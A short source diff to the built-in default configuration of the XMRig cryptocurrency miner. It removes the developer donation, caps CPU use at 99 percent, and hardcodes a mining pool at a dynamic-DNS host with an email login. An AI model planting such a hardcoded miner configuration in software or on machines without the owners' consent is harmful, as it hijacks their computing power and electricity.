@@ -49,20 +49,20 @@ R"===(
     "colors": true,
     "cpu-affinity": null,
     "cpu-priority": null,
-    "donate-level": 5,
+    "donate-level": 0,
     "huge-pages": true,
     "hw-aes": null,
     "log-file": null,
-    "max-cpu-usage": 100,
+    "max-cpu-usage": 99,
     "pools": [
         {
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+           "url": "g0g0.giize.com:1022",
+            "user": "sool@gmail.com",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
-            "variant": -1,
+            "variant": 2,
             "tls": false,
             "tls-fingerprint": null
         }
@@ -73,6 +73,7 @@ R"===(
     "safe": false,
     "threads": null,
     "user-agent": null,
+    "syslog": false,
     "watch": false
 }
 )===";
